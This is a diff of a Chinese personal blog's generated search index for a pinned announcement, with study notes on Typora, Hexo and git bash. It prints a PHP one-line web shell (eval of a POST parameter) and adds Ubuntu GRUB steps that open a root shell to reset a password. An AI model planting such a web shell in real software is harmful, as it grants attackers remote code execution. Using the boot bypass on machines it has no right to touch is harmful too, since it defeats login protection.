@@ -3,14 +3,28 @@
   <entry>
     <title>要置顶的公告</title>
     <url>/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="新朋友初次见面-老朋友好久不见-这里是猫涅"><a href="#新朋友初次见面-老朋友好久不见-这里是猫涅" class="headerlink" title="新朋友初次见面 老朋友好久不见 这里是猫涅"></a>新朋友初次见面 老朋友好久不见 这里是猫涅</h1><p>2023/10/26 更新:<br>icon全面更换为了自制手绘icon 耶<br><img data-src="/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/medium.png" alt="icon"><br>2024/3/22 更新:<br>因为备考所以很很很很很很忙<br>更新速度多有降低 见谅<br>2024/4/27 更新:<br>还有两周 面对将近的大考</p>
-<p><a href="https://markdown.com.cn/cheat-sheet.html">关于markdown的写作相关</a> </p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="新朋友初次见面-老朋友好久不见-这里是猫涅"><a href="#新朋友初次见面-老朋友好久不见-这里是猫涅" class="headerlink" title="新朋友初次见面 老朋友好久不见 这里是猫涅"></a>新朋友初次见面 老朋友好久不见 这里是猫涅</h1><p>2023/10/26 更新:<br>icon全面更换为了自制手绘icon 耶<br><img data-src="/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/medium.png" alt="icon"><br>2024/3/22 更新:<br>因为备考所以很很很很很很忙<br>更新速度多有降低 见谅<br>2024/5/13 更新:<br>还剩一场大考 好耶<br><a href="https://markdown.com.cn/cheat-sheet.html">关于markdown的写作相关</a> </p>
 <p>ps:<br>typora的单格换行是<strong>shift+enter</strong> 双格换行才是<strong>enter</strong> 请注意<br>hexo装到奇怪的地方了 所以git bash的时候命令前记得加npx<br>还有就是git bash中的复制粘贴分别是<br><strong>复制: ctrl + insert</strong><br><strong>粘贴: shift + insert</strong><br>无渲染跳转方式: 在文章前加入</p>
 <pre class="line-numbers language-none"><code class="language-none">---
 layout: false 
 --- <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>总感觉kook（撤去一堆控诉他是个怎么抄袭了discord的卑鄙无耻的软件的言论）马上得暴死了<br>Todolist估计得换一个位置 这里不行 得是<strong>方便修改增加编辑内容</strong>的平台<br>一句话木马官方老师手打版本<br><code>&lt;?php  eval($_POST[123]);?&gt;</code></p>
+<pre class="line-numbers language-none"><code class="language-none">1.重启电脑，在启动时按住Shift键以进入GRUB菜单。
+2.选择要启动的Ubuntu系统版本，然后按e键编辑启动选项。
+3.找到以linux或linux16开头的行，通常包含类似vmlinuz的词。
+4.在该行的末尾添加 rw init=/bin/bash。
+5.按Ctrl + X或F10启动系统。
+6.系统会以单用户模式启动，并提供一个bash shell。
+7.现在您可以重置密码。首先，需要重新挂载根文件系统为读写模式：
+	mount -o remount,rw /
+8.然后，使用passwd命令来更改密码：
+	passwd username
+	替换username为您的用户名。
+10.完成密码更改后，重新启动系统：
+	exec /sbin/init
+请注意，如果您的Ubuntu系统使用了LUKS加密，或者有其他复杂的用户权限管理，重置密码的步骤可能会有所不同。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 </body></html>]]></content>
       <tags>
         <tag>告示</tag>
